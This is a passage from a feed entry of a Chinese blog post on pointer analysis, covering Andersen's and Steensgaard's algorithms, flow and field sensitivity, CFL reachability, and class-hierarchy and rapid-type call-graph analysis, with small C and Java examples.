流敏感和非流敏感的区别在于：流敏感为每个程序点都计算了该点独有的程序状态</strong></p></blockquote><p>但是流敏感分析复杂度高的多，所以进行流非敏感分析常常是进一步分析的基础。接下来的指向分析时</p><ul><li>不考虑在堆上分配的内存</li><li>不考虑 struct、数组等结构</li><li>不考虑指针运算（如*(p+1)）</li></ul><p>这些限制有利于我们了解最基础的指向分析。</p><h2 id="指向分析和别名分析">指向分析和别名分析</h2><p>指针分析 (pointer analysis) 可以主要分成两类：别名分析 (alias analysis) 和指向分析 (points-to analysis)，中文语义不是很好区分。</p><blockquote><p><em>Alias analysis</em> computes a set S holding pairs of variables (p, q) , where p and q may (or must) point to the same location. On the other hand, <em>points-to analysis</em>, as described above, computes a relation <em>points-to(p, x)</em> , where p may (or must) point to the location of the variable x. We will focus our study in this lecture on points-to analysis, and will begin with a simple but useful approach originally proposed by Andersen.</p></blockquote><h2 id="Anderson-指向分析算法">Anderson 指向分析算法</h2><blockquote><p>Andersen’s points-to analysis is a context-insensitive interprocedural analysis. It is also a flow-insensitive analysis, that is an analysis that (unlike dataflow analysis) does not take into consideration the order of program statements. Context- and flow-insensitivity are used to improve the performance of the analysis, as precise pointer analysis can be notoriously<br>expensive in practice.</p></blockquote><p>该算法的指针赋值操作只有四类，而且分别对应的状态转换函数如下图所示。</p><ol><li>值变量取地址给指针赋值。</li><li>指针给指针赋值。</li><li>指针变量取值给值变量赋值。</li><li>值变量给指针指向的变量赋值。</li></ol><img src="http://cdn.blog-blockchain.xyz/202210232251369.png" alt="image-20221023225159161" style="zoom:35%;" /><p>如果读者熟悉 Datalog，以上的约束时很容易实现的。其他所有指针操作都可以分解成这四类操作，例如 <code>**a = &amp;b</code> 等价于<code>c = &amp;b;d = *c;a = *d</code>。</p><p>下面详细介绍为什么赋值语句会对应上图中的约束。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">z := <span class="number">1</span>;</span><br><span class="line">p := &amp;z;</span><br><span class="line">*p := <span class="number">2</span>;</span><br><span class="line">print z;</span><br></pre></td></tr></table></figure><p>显然打印时，<code>z=2</code> 而不是 1。逐行分解来看，<code>p := &amp;z;</code> 那么 p 就必须包括 z 的所有可能地址，这样才会是 sound 的。</p><p><code>*p := 2;</code> 那么凡是 <code>p</code> 中的元素都可能被赋值成 2，对应第四行。特别是 如果不是一个常数 2，而是一个变量，那么 p 的每一个元素都可能被 b 周的某一个元素赋值，也就是要扩大 p 对应集合的范围，包含 b 对应的集合。</p><p>上面 <code>a=*b</code> 也是类似的，a 被 b 中的某个元素赋值，考虑所有可能的情况，就相当于 b 中的每一个元素，都要在 a 的集合中。这里 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∈</mo></mrow><annotation encoding="application/x-tex">\in</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">∈</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊆</mo></mrow><annotation encoding="application/x-tex">\subseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mrel">⊆</span></span></span></span> 有些混用，可能是为了保持多重指针时的一般性。</p><p>总而言之，每次赋值就是扩充被赋值的指针或者元素。</p><h2 id="约束求解">约束求解</h2><p>请注意它是流非敏感的，所以非常适合 Datalog，读者也会理解下面的例子。</p><img src="http://cdn.blog-blockchain.xyz/202211052219857.png" alt="image-20221105221936656" style="zoom:40%;" /><p>上面右边的约束可以写成标准形式.</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1.</mn><mi mathvariant="bold-italic">p</mi><mo>=</mo><mi mathvariant="bold-italic">p</mi><mo>∪</mo><mi mathvariant="bold-italic">o</mi><mo>∪</mo><mrow><mo fence="true">(</mo><msub><mo>∪</mo><mrow><mi>v</mi><mo>∈</mo><mi mathvariant="bold-italic">q</mi></mrow></msub><mi mathvariant="bold-italic">v</mi><mo fence="true">)</mo></mrow><mo>∪</mo><mo stretchy="false">(</mo><mi>p</mi><mo>∈</mo><mi mathvariant="bold-italic">q</mi><mtext> </mtext><mtext> </mtext><mo stretchy="false">?</mo><mo stretchy="false">{</mo><mi>w</mi><mo stretchy="false">}</mo><mo>:</mo><mi mathvariant="normal">∅</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2.</mn><mi mathvariant="bold-italic">q</mi><mo>=</mo><mi mathvariant="bold-italic">q</mi><mo>∪</mo><mo stretchy="false">{</mo><mi>p</mi><mo stretchy="false">}</mo><mo>∪</mo><mo stretchy="false">(</mo><mi>q</mi><mo>∈</mo><mi mathvariant="bold-italic">q</mi><mtext> </mtext><mtext> </mtext><mo stretchy="false">?</mo><mo stretchy="false">{</mo><mi>w</mi><mo stretchy="false">}</mo><mo>:</mo><mi mathvariant="normal">∅</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>3.</mn><mi mathvariant="bold-italic">o</mi><mo>=</mo><mi mathvariant="bold-italic">o</mi><mo>∪</mo><mo stretchy="false">{</mo><mi>v</mi><mo stretchy="false">}</mo><mo>∪</mo><mo stretchy="false">(</mo><mi>o</mi><mo>∈</mo><mi mathvariant="bold-italic">q</mi><mtext> </mtext><mtext> </mtext><mo stretchy="false">?</mo><mo stretchy="false">{</mo><mi>w</mi><mo stretchy="false">}</mo><mo>:</mo><mi mathvariant="normal">∅</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}1. \boldsymbol{p}=\boldsymbol{p}\cup \boldsymbol{o}\cup \left( \cup _{v\in \boldsymbol{q}}\boldsymbol{v} \right) \cup (p\in \boldsymbol{q}\,\,?\{w\}:\varnothing )\\2. \boldsymbol{q}=\boldsymbol{q}\cup \{p\}\cup (q\in \boldsymbol{q}\,\,?\{w\}:\varnothing )\\3. \boldsymbol{o}=\boldsymbol{o}\cup \{v\}\cup (o\in \boldsymbol{q}\,\,?\{w\}:\varnothing )\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.91em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35em;"><span style="top:-2.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.192em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"/></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"/></svg></span></span><span style="top:-4.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.85em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1.</span><span class="mord"><span class="mord"><span class="mord boldsymbol">p</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol">p</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol">o</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2274em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mtight"><span class="mord boldsymbol mtight" style="margin-right:0.03704em;">q</span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord"><span class="mord boldsymbol" style="margin-right:0.03704em;">v</span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol" style="margin-right:0.03704em;">q</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mclose">?</span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord amsrm">∅</span><span class="mclose">)</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">2.</span><span class="mord"><span class="mord"><span class="mord boldsymbol" style="margin-right:0.03704em;">q</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol" style="margin-right:0.03704em;">q</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">{</span><span class="mord mathnormal">p</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol" style="margin-right:0.03704em;">q</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mclose">?</span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord amsrm">∅</span><span class="mclose">)</span></span></span><span style="top:-1.53em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">3.</span><span class="mord"><span class="mord"><span class="mord boldsymbol">o</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol">o</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal">o</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol" style="margin-right:0.03704em;">q</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mclose">?</span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord amsrm">∅</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.91em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>涉及到 p 的约束有右边的 3、4、5 行，第 3、4 行很直接，通过并操作限定条件。第 5 行则是间接的，因为 q 里面可能包含了 p，那么 w 可能也会在 p 的范围内。总之，以上的约束都转变成了 p 的扩充。以此类推。</p><p>笔者这时也没有对这样的规则感到得心应手，暂且学下去，等深入学习和实际应用之后会逐渐加深掌握的。</p><p>之后开始不断计算上述的三个等式，比如 p 变了，那么涉及到 p 的所有等式重新运算，以这样的方式计算直到达到不动点，也就是所有变量的集合都不变了。具体方法是先确定变量之间的包含关系如下图：</p><img src="https://cdn.blog-blockchain.xyz/202211052251017.png" alt="image-20221105225124965" style="zoom:40%;" /><p>但是这里还少了条件下或者说全称量词下的包含关系，那么就要监听全称量词，满足条件则进行对应操作。</p><p><strong>后续很多研究进一步优化了指针分析</strong>，可以阅读这一篇核心文献：The Ant and the Grasshopper: Fast and Accurate Pointer Analysis for Millions of Lines of Code, Hardekopf and Lin,PLDI 2007</p><h1>流敏感指向分析</h1><p>首先，SSA 形式下流非敏感和流敏感是等价的，因为每个变量只会赋值一次，那么就不会存在模糊的指向了。但是之前也提到 SSA 在循环、递归等方面存在局限性，所以流敏感指针分析可以提高精度。流敏感指向分析主要是数据流分析和 Anderson 算法的结合。</p><img src="http://cdn.blog-blockchain.xyz/202211061044209.png" alt="image-20221106104436134" style="zoom: 43%;" /><p>前三条操作都比较显然，第四条主要是考虑到 a 实际上只会指向一个位置，那么如果 a 里的元素是多个可能的地址（比如由分支交汇造成的），那么完全替代所有地址对应的集合是不 sound 的，因此多个地址的情况下，采用并集。</p><p><strong>后续很多研究进一步优化了指针分析</strong>，最新工作采用部分 SSA 来对流敏感进行加速，可 以应用到百万量级的代码，核心论文：Hardekopf B, Lin C. Flow-sensitive pointer analysis for millions of lines of code. CGO 2011:289-298.</p><h1>指向分析的难点</h1><h2 id="动态分配在堆的内存">动态分配在堆的内存</h2><p>分析堆上分配的内存是一个难点，这种动态分配内存无法知道分配了多少次，比如写在循环里面。那么，一般会做一层抽象，只考虑代码出现的位置，所有循环到这一行代码，都视作同一块内存。因此，编译器处理数组时一般都是把数组当一个节点，而且大多数框架的指针分析算法不支持数组和指针运算。</p><p>所以，尽量避免指针运算是一个较好的编程习惯，另外部分语言不支持指针运算，也是有这方面的考虑。</p><h2 id="数组和指针运算">数组和指针运算</h2><p>简单地说比如 C 语言 支持指针运算，比如 <code>*(p+i)</code> 或者数组 <code>p[i]</code>。这会给分析带来巨大的困难，因为必须要把运算的范围和指针范围结合起来，单独的较为精确的分析已经很复杂了，二者结合极难实现。因此，一般大多数分析框架不支持数组和指针运算。</p><h2 id="结构体、对象、容器内的指针">结构体、对象、容器内的指针</h2><p>以 C 语言结构体双向链表为例，结构体内的指针和结构体外的指针是不同的，对于两个不同链表，next 这个名字相同的变量也不是代表指向相同的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Struct Node &#123; <span class="type">int</span> value; Node* next; Node* prev;&#125;;</span><br><span class="line">a = <span class="built_in">malloc</span>();</span><br><span class="line">a-&gt;next = b;</span><br><span class="line">a-&gt;prev = c;</span><br></pre></td></tr></table></figure><p>一般由域非敏感分析和域敏感分析。</p><h2 id="域非敏感分析">域非敏感分析</h2><p>域非敏感（Field-Insensitive）分析比较简单粗暴，直接忽视结构体、对象自身的辖域。第一个办法是直接把结构体当作是一个整体，结构体里面指针的赋值就当作给结构体赋值，见下图。</p><img src="http://cdn.blog-blockchain.xyz/202211061126496.png" alt="image-20221106112608424" style="zoom:50%;" /><p>第二种办法是不管结构体变量之间的区别了，一视同仁。</p><img src="http://cdn.blog-blockchain.xyz/202211061127249.png" alt="image-20221106112740183" style="zoom:50%;" /><h2 id="域敏感分析">域敏感分析</h2><img src="http://cdn.blog-blockchain.xyz/202211061303625.png" alt="image-20221106130335551" style="zoom:50%;" /><p>简单地说，就是</p><ul><li>创建时添加结构体内的指针变量</li><li>赋值时将结构体拆分成几个字段和结构体变量名。</li></ul><p>后续实践时会做这一部分。</p><h1>基于 CFL 可达性的域敏感分析</h1><p>回忆 CFL 之前用于函数括号匹配，用来区分不同上下文中的相同函数调用。这里只要将函数这个范围替换成结构体或者对象这个范围即可。</p><img src="http://cdn.blog-blockchain.xyz/202211062118903.png" alt="image-20221106211811844" style="zoom: 50%;" /><ul><li>new 表示新建了指针</li><li>put[f] 表示上一个节点下一个节点内部的值 f (比如结构体内字段) 赋值。</li><li>assign 表示直接赋值</li><li>get[f] 表示从上一个节点取出内部的变量 f 给下一个节点赋值。</li></ul><p>从以上的定义，出现了如下的结论：</p><img src="http://cdn.blog-blockchain.xyz/202211062124955.png" alt="image-20221106212440908" style="zoom:50%;" /><ul><li>下划线表示逆过程。</li><li><code>*</code> 表示前面的部分可以出现一次或者多次。</li><li>变量 A 可以流向 B 的情况只存在于<ol><li>创建变量 A</li><li>以下两种情况之一。<ol><li>给指针 A 赋值</li><li><code>put[f]</code>, A 被赋值给下一个变量 C 的某个字段 f</li><li>变量 D 是变量 C 的别名。</li><li><code>get[f]</code> 变量 D 的字段 f 被赋值给 E。</li></ol></li><li>重复步骤二，如果最后可以赋值给变量 B，那么表示变量 A 可以流向 B。</li></ol></li><li>指向则是与流向是相反的过程。</li><li>别名则是两个变量既可以指向也可以流向。</li></ul><p>如果读者熟悉离散数学的二元关系、等价关系之类的推导，应该能够较快理解以上过程。</p><p>从上述步骤可以看到，<code>put[f]</code> 和 <code>get[f]</code> 就相当于之前学习的 CFL 可达性里的括号，只需要沿着括号匹配的方向去构建图。最后可以证明，基于 CFL 和基于 Anderson 算法的域敏感分析是等价的，这里不做证明。</p><img src="http://cdn.blog-blockchain.xyz/202211062138761.png" alt="image-20221106213817690" style="zoom:50%;" /><h1>Steensgaard 算法</h1><p>这个算法的核心是，指针 p 可能指向多个对象，那么就可以把多个对象合并成一个，让 p 只指向一个对象。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = &amp;x;</span><br><span class="line">r = &amp;p;</span><br><span class="line">q = &amp;y;</span><br><span class="line">s = &amp;q;</span><br><span class="line">r = s;</span><br></pre></td></tr></table></figure><p>按照 Anderson 指针分析算法，p 指向 x，其他以此类推。r 和 s 是同名，所以可以得到左图图。然后 p 指向了多个对象，那么就把 p 和 q 合并，就变成了右图。</p><p><img src="http://cdn.blog-blockchain.xyz/202211192338135.png" alt="image-20221119233728911"><img src="http://cdn.blog-blockchain.xyz/202211192339253.png" alt="image-20221119233904211"></p><p>虽然这个过程降低了精度，比如 p 本来不会指向 y 的，s 也不会指向 q 的，不过保证了 sound，不会漏掉原来的情况。合并之后，发现 pq 指向了多个对象，所以还要继续合并。</p><img src="http://cdn.blog-blockchain.xyz/202211192341123.png" alt="image-20221119234154069" style="zoom:67%;" /><p>最终，可以表达成如下形式。<code>p</code> 表示地址； <code>*p</code> 表示 p 指向的集合，也就是 p 所有可能指向的对象。join 的意思是把这两个东西合并，如果两个东西是相同的，那么久不用进行任何操作。例如上面的例子中 p q 合并就是因为 <code>s=r</code>，<code>p=&amp;x</code> 就需要把 p 指向的其他东西和 x 合并。依次类推。</p><p><img src="http://cdn.blog-blockchain.xyz/202211192344259.png" alt="image-20221119234441212"></p><p>只要按照着语句顺序执行下来，那么就不会发生回溯去递归，所以除了合并操作外，线性的复杂度就可以完成。这就不像 Anderson 算法，需要生成约束，然后约束不断迭代，直到不动点。</p><h1>上下文敏感</h1><p>这里主要考虑上下文敏感和域敏感指针分析同时出现的情况，我们知道上下文敏感主要是说函数在不同的地方调用，可以通过括号匹配的方式提高精度。上文以提到过，域敏感分析也可以通过 put-get 匹配完成。但是这两者的交集不一定是上下文无关问题，所以同时满足上下文敏感和域敏感是不可能实现的。</p><p>可以在两者之间折衷。</p><h2 id="降低上下文敏感性">降低上下文敏感性</h2><p>把被调方法根据上下文克隆 n 次。下面的例子中，<code>SetF(y,m)</code> 相当于 <code>m.F=y</code>，但是可以更加抽象化，表示 y 赋值给 m 的 F 域。这里为了方便入门可以改写成更加明显地形式。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">y = <span class="keyword">new</span> <span class="built_in">A</span>();</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">A</span>();</span><br><span class="line">m.F = y;</span><br><span class="line">x = y;</span><br><span class="line">y.F = m;</span><br><span class="line">n = x.F;</span><br></pre></td></tr></table></figure><img src="http://cdn.blog-blockchain.xyz/202211201030565.png" alt="image-20221120103036498" style="zoom: 67%;" /><p>按照之前学习的，可以将 SetF() 函数克隆，第一次调用的参数记作 <code>a,1</code> 和 <code>b,1</code>，第二次调用记作 <code>a,2</code> 和 <code>b,2</code>，这样区别了不同的上下文。其他的 <code>n,0</code> 表示在 Main 函数中的变量。</p><h2 id="降低域敏感性">降低域敏感性</h2><p>把域展开 n 次，这个想法在链表中体现的尤为明显。</p><img src="http://cdn.blog-blockchain.xyz/202211201046370.png" alt="image-20221120104647288" style="zoom:67%;" /><p>展开的一次的话，就会把 Node* a 这个对象里面的指针展开，当作是与 a 同一个域的变量。然后赋值时，规定对应的约束。注意上面的 <code>=</code> 不是表示赋值，而是表示别名。这样做的理由是为了避免单向指向，导致失去类似于 <code>z= 1;p = &amp;z;*p=2</code>这样间接修改<code>z</code> 的情况。</p><p>下面是展开两次的情况：</p><img src="http://cdn.blog-blockchain.xyz/202211201105767.png" alt="image-20221120110545690" style="zoom: 50%;" /><h1>控制流分析</h1><p>C 语言和其他某些语言都支持函数指针，这就造成了我们可能并不知道数据流中究竟调用了哪个函数。所以有时候我们并不知道有哪些控制流，更加致命的是一些接口类型或者虚函数，控制流并不直接。因此，我们可以知道指针分析其实是过程间分析中非常重要的内容。</p><p>控制流分析就是研究可能的控制流的情况，所以是 may analysis，这里和数据流分析是一样的，都是结果只能比实际的多，但是不能少。控制流分析和数据流分析的关系如下：</p><ul><li>控制流分析确定程序控制的流向</li><li>数据流分析确定程序中数据的流向。</li><li>数据流分析在控制流图上完成，因此<strong>控制流分析是数据流分析的基础</strong>。</li></ul><h2 id="Class-Hierarchy-Analysis">Class Hierarchy Analysis</h2><p>极其简单，根据函数赋值对象的类型去筛选函数，然后所有筛选后的实现都是可能的，然后把不同实现的返回值合并起来。这种方式极其不精确，一旦实现多了，那么就没用了。</p><img src="http://cdn.blog-blockchain.xyz/202211212221316.png" alt="image-20221121222110155" style="zoom:67%;" /><h2 id="Rapid-Type-Analysis">Rapid Type Analysis</h2><p>这个稍微精确一些，只考虑那些在程序中创建了 的对象，加了一层的筛选。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nterface I &#123; <span class="keyword">void</span> <span class="title function_">m</span><span class="params">()</span>; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">implements</span> <span class="title class_">I</span> &#123; <span class="keyword">void</span> <span class="title function_">m</span><span class="params">()</span> &#123; x = <span class="number">1</span>; &#125; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">implements</span> <span class="title class_">I</span> &#123; <span class="keyword">void</span> <span class="title function_">m</span><span class="params">()</span> &#123; x = <span class="number">2</span>; &#125; &#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">I</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">    i.m();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123; <span class="keyword">void</span> <span class="title function_">m</span><span class="params">()</span> &#123; <span class="keyword">new</span> <span class="title class_">B</span>().m();</span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><p>具体流程如下，初始化两个集合 <code>Methods</code> 和 <code>Classes</code>，记录调用和方法之间的关系集合 <code>Calls-&gt;Methods</code>。初始时刻 <code>Methods</code> 只包括 <code>main()</code> 函数，然后开始逐行扫描：</p><ol><li><p>如果遇到一个新的方法（相当于函数）的调用 <code>m</code>，那么将在次调用之前，所有实现了这个方法的类加入到 <code>Classes</code> 集合中。</p></li><li><p>如果 <code>Classes</code> 集合中增加了一个类 <code>A</code>，那么就把这次调用和类中的方法匹配，也即将 <code>1:m()-&gt;A.()</code> 加入 <code>Calls-&gt;Methods</code> 中。这里的 <code>1:m</code> 是考虑到上下文敏感性，对不同上下文的调用编号了。</p></li><li><p>将方法 <code>m</code> 中的所有方法（例如 <code>m</code> 嵌套了其他方法 <code>n</code>）加入到 <code>Methods</code> 中，递归地执行第 1 步。</p></li></ol><p>分析速度很快，但是分析的精度优先，如果之前有多个实现，那么就也搞不定了，不过这样的分析实际工程中有所采用。</p><h2 id="精确控制流分析">精确控制流分析</h2><p>简单地说是一边进行指针分析，一遍进行 control flow analysis (CFA)。这一小部分的内容有些难，暂时跳过。</p><h1>参考</h1><p>除了上文每处标出的来源链接，以及这个系列最开始的说明以外，还参考了：</p><ul><li><a href="https://www.cs.cmu.edu/~aldrich/courses/15-819O-13sp/resources/pointer.pdf">https://www.cs.cmu.edu/~aldrich/courses/15-819O-13sp/resources/pointer.pdf</a></li><li>Neil D. Jones, Steven S. Muchnick: Flow Analysis and Optimization of Lisp-Like Structures. POPL 1979: 244-256</li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/pl/understanding-program-analysis/&quot; title=&quot;（一）初识软件分析&quot;&gt;（一）初识软件分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/data-flow-analysis/&quot; title=&quot;（二）数据流分析基础&quot;&gt;（二）数据流分析基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/LP-souffle/&quot; title=&quot;（三）Datalog和程序分析&quot;&gt;（三）Datalog和程序分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/ssa-and-sparse-analysis/&quot; title=&quot;（四）静态单赋值和稀疏分析&quot;&gt;（四）静态单赋值和稀疏分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/Interprocedural-DFA/&quot; title=&quot;（五）过程间分析&quot;&gt;（五）过程间分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/points-to-analysis/&quot; title=&quot;（六）指向分析&quot;&gt;（六）指向分析&lt;</summary>
        
      
    
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/categories/program-language/"/>
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/tags/program-language/"/>
    
  </entry>
  
  <entry>
    <title>默克尔准备金（Merkle Tree Proof of Reserves)</title>
    <link href="https://www.blog-blockchain.xyz/defi/Merkle-Tree-Proof-of-Reserves/"/>
    <id>https://www.blog-blockchain.xyz/defi/Merkle-Tree-Proof-of-Reserves/</id>
    <published>2022-11-19T14:16:22.000Z</published>
    <updated>2024-11-18T09:49:17.835Z</updated>
    
